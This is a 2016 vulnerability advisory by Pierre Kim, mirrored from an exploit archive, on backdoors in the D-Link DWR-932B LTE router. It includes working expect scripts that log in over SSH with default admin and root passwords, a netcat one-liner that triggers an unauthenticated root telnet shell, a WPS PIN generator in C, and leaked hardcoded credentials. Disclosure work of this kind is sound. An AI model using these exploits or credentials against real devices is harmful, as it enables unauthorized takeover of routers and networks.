@@ -1,0 +1,529 @@
+id: 24943
+date: 09/29/2016
+title: D-Link DWR-932B Backdoors / Default WPS PIN
+author: Pierre Kim
+cves: 
+
+## Advisory Information
+
+Title: Multiple vulnerabilities found in the Dlink DWR-932B (backdoor,
+backdoor accounts, weak WPS, RCE ...)
+Advisory URL: https://pierrekim.github.io/advisories/2016-dlink-0x00.txt
+Blog URL: https://pierrekim.github.io/blog/2016-09-28-dlink-dwr-932b-lte-routers-vulnerabilities.html
+Date published: 2016-09-28
+Vendors contacted: Dlink
+Release mode: Released
+CVE: no current CVE
+DWF: no current DWF
+
+
+
+## Product Description
+
+Dlink is a multinational networking equipment manufacturing corporation.
+
+
+
+## Vulnerabilities Summary
+
+The Dlink DWR-932B is a LTE router / access point overall badly
+designed with a lot of vulnerabilities.
+It's available in a number of countries to provide Internet with a LTE network.
+It's a model based on the (in)famous Quanta LTE router models and
+inherits some vulnerabilities.
+
+The tests below are done using the latest available firmware (firmware
+DWR-932_fw_revB_2_02_eu_en_20150709.zip,
+model revision B,
+/Share3/DailyBuild/QDX_DailyBuild/QDT_2031_DLINK/QDT_2031_OS/source/LINUX/apps_proc/oe-core/build/tmp-eglibc/sysroots/x86_64-linux/usr/bin/armv7a-vfp-neon-oe-linux-gnueabi/arm-oe-linux-gnueabi-gcc).
+
+The summary of the vulnerabilities is:
+
+  - Backdoor accounts
+  - Backdoor
+  - Default WPS PIN
+  - Weak WPS PIN Generation - with a reverse-engineered algorithm
+  - Leaking No-IP account (?)
+  - Multiple vulnerabilities in the HTTP daemon (qmiweb)
+  - Remote FOTA (Firmware Over The Air)
+  - Bad security practices
+  - Security removed in UPnP
+
+A personal point of view: at best, the vulnerabilites are due to
+incompetence; at worst, it is a deliberate act of security sabotage
+from the vendor. Not all the vulnerabilities found have been disclosed
+in this advisory. Only the significant ones are shown.
+
+This router is still on sale.
+
+Due to lack of security patches provided by the vendor, the
+vulnerabilities will remain unpatched and customers with questions
+should contact their local/regional D-Link support office for the
+latest information.
+
+
+## Details - Backdoor accounts
+
+By default, telnetd and SSHd are running in the router.
+
+Telnetd is running even if there is no documentation about it:
+
+    user@kali:~$ cat ./etc/init.d/start_appmgr
+
+    [...]
+    #Sandro { for telnetd debug...
+    start-stop-daemon -S -b -a /bin/logmaster
+    #if [ -e /config2/telnetd ]; then
+            start-stop-daemon -S -b -a /sbin/telnetd
+    #fi
+    #Sandro }
+    [...]
+
+2 backdoor accounts exist and can be used to bypass the HTTP
+authentication used to manage the router.
+
+    admin@homerouter:~$ grep admin /etc/passwd
+    admin:htEcF9TWn./9Q:168:168:admin:/:/bin/sh
+    admin@homerouter:~$
+
+The password for admin is 'admin' and can be found in the /bin/appmgr
+program using IDA:
+
+About the root user:
+
+    user@kali:~$ cat ./etc/shadow
+    root:aRDiHrJ0OkehM:16270:0:99999:7:::
+    daemon:*:16270:0:99999:7:::
+    bin:*:16270:0:99999:7:::
+    sys:*:16270:0:99999:7:::
+    sync:*:16270:0:99999:7:::
+    games:*:16270:0:99999:7:::
+    man:*:16270:0:99999:7:::
+    lp:*:16270:0:99999:7:::
+    mail:*:16270:0:99999:7:::
+    news:*:16270:0:99999:7:::
+    uucp:*:16270:0:99999:7:::
+    proxy:*:16270:0:99999:7:::
+    www-data:*:16270:0:99999:7:::
+    backup:*:16270:0:99999:7:::
+    list:*:16270:0:99999:7:::
+    irc:*:16270:0:99999:7:::
+    gnats:*:16270:0:99999:7:::
+    diag:*:16270:0:99999:7:::
+    nobody:*:16270:0:99999:7:::
+    messagebus:!:16270:0:99999:7:::
+    avahi:!:16270:0:99999:7:::
+    admin@kali:~$
+
+Using john to crack the hashes:
+
+    user@kali:~$ john -show shadow+passwd
+    admin:admin:admin:/:/bin/sh
+    root:1234:16270:0:99999:7:::
+
+    2 password hashes cracked, 0 left
+    user@kali:~$
+
+Results:
+
+ - admin has password admin
+ - root has password 1234
+
+
+Working exploit for admin:
+
+    user@kali:~$ cat quanta-ssh-default-password-admin
+    #!/usr/bin/expect -f
+
+    set timeout 3
+    spawn ssh admin@192.168.1.1
+    expect "password: $"
+    send "admin\r"
+    interact
+    user@kali:~$ ./quanta-ssh-default-password-admin
+    spawn ssh admin@192.168.1.1
+    admin@192.168.1.1's password:
+    admin@homerouter:~$ id
+    uid=168(admin) gid=168(admin) groups=168(admin)
+    admin@homerouter:~$
+
+
+Alternatively, you can fetch it at
+https://pierrekim.github.io/advisories/quanta-ssh-default-password-admin.
+
+Working exploit for root:
+
+    user@kali:~$ cat quanta-ssh-default-password-root
+    #!/usr/bin/expect -f
+
+    set timeout 3
+    spawn ssh root@192.168.1.1
+    expect "password: $"
+    send "1234\r"
+    interact
+    user@kali:~$ ./quanta-ssh-default-password-root
+    spawn ssh root@192.168.1.1
+    root@192.168.1.1's password:
+    root@homerouter:~# id
+    uid=168(root) gid=168(root) groups=168(root)
+    root@homerouter:~#
+
+
+Alternatively, you can fetch it at
+https://pierrekim.github.io/advisories/quanta-ssh-default-password-root.
+
+
+
+## Details - Backdoor
+
+A backdoor is present inside the `/bin/appmgr` program. By sending a
+specific string in UDP to the router, an authentication-less telnet
+server will start if a telnetd daemon is not already running.
+
+In `/bin/appmgr`, a thread listens to 0.0.0.0:39889 (UDP) and waits
+for commands.
+
+If a client sends "HELODBG" to the router, the router will execute
+`/sbin/telnetd -l /bin/sh`, allowing to access without authentication
+to the router as root.
+
+When using IDA, we can see the backdoor is located in the main
+function (line 369):
+
+[please visit the HTML version at
+https://pierrekim.github.io/blog/2016-09-28-dlink-dwr-932b-lte-routers-vulnerabilities.html
+to see the image]
+
+
+Working PoC :
+
+    user@kali:~$ echo -ne "HELODBG" | nc -u 192.168.1.1 39889
+    Hello
+    ^C
+    user@kali:~$ telnet 192.168.1.1
+    Trying 192.168.1.1...
+    Connected to 192.168.1.1.
+    Escape character is '^]'.
+
+    OpenEmbedded Linux homerouter.cpe
+
+
+    msm 20141210 homerouter.cpe
+
+    / # id
+    uid=0(root) gid=0(root)
+    / # exit
+    Connection closed by foreign host.
+    user@kali:~$
+
+
+
+## Details - Default WPS PIN
+
+Wi-Fi Protected Setup(WPS) is a standard for easy and secure
+establishment of a wireless home network, as defined in the
+documentation provided in the router (help.html).
+
+By default, the PIN for the WPS system is ever 28296607. It is, in
+fact, hardcoded in the /bin/appmgr program:
+
+This PIN can be found in the HostAP configuration too, and, using the
+information leak, in the HTTP APIs of the router:
+
+    root@homerouter:~# ps -a|grep hostap
+     1006 root       0:00 hostapd /var/wifi/ar6k0.conf
+     1219 root       0:00 grep hostap
+    root@homerouter:~# cat /var/wifi/ar6k0.conf
+    [...]
+    ap_pin=28296607
+    [...]
+
+
+
+## Details - Weak WPS PIN Generation - with a reverse-engineered algorithm
+
+An user can use the webinterface to generate a temporary PIN for the
+WPS system (low probability as the 28296607 WPS PIN is provided by
+default).
+
+The PIN generated by the router is weak as it is generated using this
+"strange" reverse-engineered algorithm:
+
+    user@kali:~$ cat quanta-wps-gen.c
+
+    #include <stdio.h>
+    #include <stdlib.h>
+    #include <time.h>
+
+
+    int main(int    argc,
+             char   **argv,
+             char   **envp)
+    {
+      unsigned int  i0, i1;
+      int           i2;
+
+      /* the seed is the current time of the router, which uses NTP... */
+      srand(time(0));
+
+      i0 = rand() % 10000000;
+      if (i0 <= 999999)
+        i0 += 1000000;
+      i1 = 10 * i0;
+      i2 = (10 - (i1 / 10000 % 10 + i1 / 1000000 % 10 + i1 / 100 % 10 + 3 *
+           (i1 / 100000 % 10 + 10 * i0 / 10000000 % 10 + i1 / 1000 %
+10 + i1 / 10 % 10))
+            % 10) % 10 + 10 * i0;
+
+      printf("%d\n", i2 );
+
+      return (0);
+    }
+
+
+    user@kali:~$ gcc -o dlink-wps-gen quanta-wps-gen.c
+    user@kali:~$ ./dlink-wps-gen
+    97329329
+    user@kali:~$
+
+
+You can fetch this program at
+https://pierrekim.github.io/advisories/quanta-wps-gen.c.
+
+Using `srand(time(0))` as a seed is a bad idea because an attacker,
+knowing the current date as `time(0)` returns the current date in an
+integer value, can just generate the valid WPS PIN. The Router uses
+NTP so is likely to have a correct timestamp configured. It's trivial
+for an attacker to generate valid WPS PIN suites and bruteforce them.
+
+For the curious reader, the original algorithm in the firmware is:
+
+[please visit the HTML version at
+https://pierrekim.github.io/blog/2016-09-28-dlink-dwr-932b-lte-routers-vulnerabilities.html
+to see this long content]
+
+
+
+## Details - Leaking No-IP account (?):
+
+The file `/etc/inadyn-mt.conf` (for a dyndns client) contains an user
+and a hardcoded password:
+
+    --log_file /usr/inadyn_srv.log
+    --forced_update_period 6000
+    --username alex_hung
+    --password 641021
+    --dyndns_system default@no-ip.com
+    --alias test.no-ip.com
+
+
+
+## Details - Multiple vulnerabilities in the HTTP daemon (qmiweb)
+
+The HTTP daemon `/bin/qmiweb` is full of vulnerabilities.
+
+You can see my precedent researches about a router model using a
+similar firmware:
+
+  - https://pierrekim.github.io/blog/2016-04-04-quanta-lte-routers-vulnerabilities.html#webinterface-information-leak
+  - https://pierrekim.github.io/blog/2016-04-04-quanta-lte-routers-vulnerabilities.html#rce-1
+  - https://pierrekim.github.io/blog/2016-04-04-quanta-lte-routers-vulnerabilities.html#rce-2
+  - https://pierrekim.github.io/blog/2016-04-04-quanta-lte-routers-vulnerabilities.html#arbitrary-file-browsing-using-the-http-daemon
+  - https://pierrekim.github.io/blog/2016-04-04-quanta-lte-routers-vulnerabilities.html#arbitrary-file-reading-using-the-http-daemon
+
+Adapting the exploits is left as exercises for the reader :)
+
+
+
+## Details - Remote FOTA (Firmware Over The Air)
+
+The credentials to contact the FOTA server are hardcoded in the
+`/sbin/fotad` binary, as shown with this IDA screenshot:
+
+[please visit the HTML version at
+https://pierrekim.github.io/blog/2016-09-28-dlink-dwr-932b-lte-routers-vulnerabilities.html
+to see the image]
+
+
+The function sub_CAAC contains the credentials as base64-strings, used
+to retrieve the firmware.
+
+It's notable the FOTA daemon tries to retrieve the firmware over
+HTTPS. But at the date of the writing, the SSL certificate for
+https://qdp:qdp@fotatest.qmitw.com/qdh/ispname/2031/appliance.xml is
+invalid for 1.5 year.
+
+[please visit the HTML version at
+https://pierrekim.github.io/blog/2016-09-28-dlink-dwr-932b-lte-routers-vulnerabilities.html
+to see the image]
+
+The user/password combinations are:
+
+    qdpc:qdpc
+    qdpe:qdpe
+    qdp:qdp
+
+
+
+## Details - Bad security practices:
+
+- From `/etc/init.d/start_appmgr`, you will read "strange" shell
+commands executed as root, like:
+
+    if [  -f /sbin/netcfg ]; then
+            echo -n "chmod 777 netcfg"
+            chmod 777 /sbin/netcfg
+    fi
+    if [  -f /bin/QNetCfg ]; then
+            echo -n "chmod 777 QNetCfg"
+            chmod 777 /bin/QNetCfg
+    fi
+
+I have no idea why the vendor needs to chmod 777 files located in /bin/.
+
+
+
+## Details - Security removed in UPnP
+
+UPnP allows to add firewall rules dynamically. Because of the security
+risks involved, generally there are restrictions in place to avoid
+dangerous new firewall rules from an unstrusted LAN client.
+
+Insecurity in IPnP was hype 10 years ago (in 2006). The security level
+of the UPNP program (miniupnp) in this router is volountarily lowered
+as shown below and allows an attacker located in the LAN area to add
+Port forwarding from the Internet to other clients located in the LAN:
+
+The `/var/miniupnpd.conf` is generated by the `/bin/appmgr` program:
+
+[please visit the HTML version at
+https://pierrekim.github.io/blog/2016-09-28-dlink-dwr-932b-lte-routers-vulnerabilities.html
+to see the image]
+
+
+It will generate the /var/miniupnpd.conf file:
+
+    ext_ifname=rmnet0
+    listening_ip=bridge0
+    port=2869
+    enable_natpmp=yes
+    enable_upnp=yes
+    bitrate_up=14000000
+    bitrate_down=14000000
+    secure_mode=no      # "secure" mode : when enabled, UPnP client
+are allowed to add mappings only to their IP.
+    presentation_url=http://192.168.1.1
+    system_uptime=yes
+    notify_interval=30
+    upnp_forward_chain=MINIUPNPD
+    upnp_nat_chain=MINIUPNPD
+
+There is no restriction about the UPnP permission rules in the
+configuration file, contrary to common usage in UPnP where it is
+advised to only allow redirection of port above 1024:
+
+
+Normal config file:
+
+    # UPnP permission rules
+    # (allow|deny) (external port range) ip/mask (internal port range)
+    # A port range is <min port>-<max port> or <port> if there is only
+    # one port in the range.
+    # ip/mask format must be nn.nn.nn.nn/nn
+    # it is advised to only allow redirection of port above 1024
+    # and to finish the rule set with "deny 0-65535 0.0.0.0/0 0-65535"
+    allow 1024-65535 192.168.0.0/24 1024-65535
+    deny 0-65535 0.0.0.0/0 0-65535
+
+
+In the configuration of the vulnerable router where there are no
+permission rules, an attacker can forward everything from the WAN into
+the LAN. For example, an attacker can add a forwarding rule in order
+to allow traffic from the Internet to local Exchange servers, mail
+servers, ftp servers, http servers, database servers... In fact, this
+lack of security allows a local user to forward whatever they want
+from the Internet into the LAN.
+
+
+## Personal notes
+
+As the router has a sizable memory (168 MB), a decent CPU and good
+free space (235 MB) with complete toolkits installed by default (sshd,
+proxy (/bin/tinyproxy -c /var/tproxy.conf), tcpdump ...), I advise
+users to trash their routers because it's trivial for an attacker to
+use this router as an attack vector (ie: hosting a sniffing tool, LAN
+hacking, active MiTM tool, spamming zombie).
+
+- From my tests, it is possible to overwrite the firmware with a
+custom (backdoored) firmware. Generating a valid backdoored firmware
+is left as an exercise for the reader, but with all these
+vulnerabilities present in the default firmware, I don't think it is
+worth making the effort.
+
+
+
+## Vendor Response
+
+  Customers with questions should contact their local/regional D-Link
+support offices for the latest information.
+
+
+
+## Report Timeline
+
+ * Dec 04, 2015: Vulnerabilities found by Pierre Kim in Quanta routers.
+ * Apr 04, 2016: A public advisory about Quanta routers is sent to
+security mailing lists.
+ * Jun 09, 2016: Pierre Kim is contacted by Gianni Carabelli about
+Dlink DWR-932 router's similarities to Quanta routers.
+ * Jun 14, 2016: Pierre Kim thanks Gianni Carabelli and says he will
+contact Dlink.
+ * Jun 15, 2016: Dlink is contacted about vulnerabilities in the
+DWR-932 router (=~ 20 vulns).
+ * Jun 16, 2016: Dlink Security Incident Response Team (William Brown)
+acknowledges the receipt of the report and says they will provide
+further updates.
+ * Jul 09, 2016: Pierre asks for updates.
+ * Jul 09, 2016: Dlink says they will have correction by July 15.
+ * Jul 19, 2016: Pierre asks for updates.
+ * Aug 19, 2016: Pierre asks for updates.
+ * Sep 12, 2016: Pierre asks for updates and says he will soon release
+an advisory as 90 days have passed without news.
+ * Sep 12, 2016: cert@cert.org is contacted to get pieces of advice
+about the disclosure.
+ * Sep 13, 2016: CERT recommends to try to contact D-link and to
+publish the advisory.
+ * Sep 13, 2016: Dlinks says they don't have a schedule for a firmware
+release. Customers who have questions should contact their
+local/regional D-Link support offices for the latest information.
+support.dlink.com will be updated in the next 24 hours.
+ * Sep 28, 2016: A public advisory is sent to security mailing lists.
+
+
+
+## Credits
+
+These vulnerabilities were found by Pierre Kim (@PierreKimSec).
+
+I would like to thank Gianni Carabelli who found this router and
+thought it was very similar to the previous backdoored Quanta routers.
+
+
+
+## References
+
+https://pierrekim.github.io/advisories/2016-dlink-0x00.txt
+
+https://pierrekim.github.io/blog/2016-09-28-dlink-dwr-932b-lte-routers-vulnerabilities.html
+
+https://www.linkedin.com/pulse/rooting-dlink-dwr-923-4g-router-gianni-carabelli
+
+
+
+## Disclaimer
+
+This advisory is licensed under a Creative Commons Attribution
+Non-Commercial Share-Alike 3.0 License:
+http://creativecommons.org/licenses/by-nc-sa/3.0/
+
+#  0day.today [2023-03-23]  #
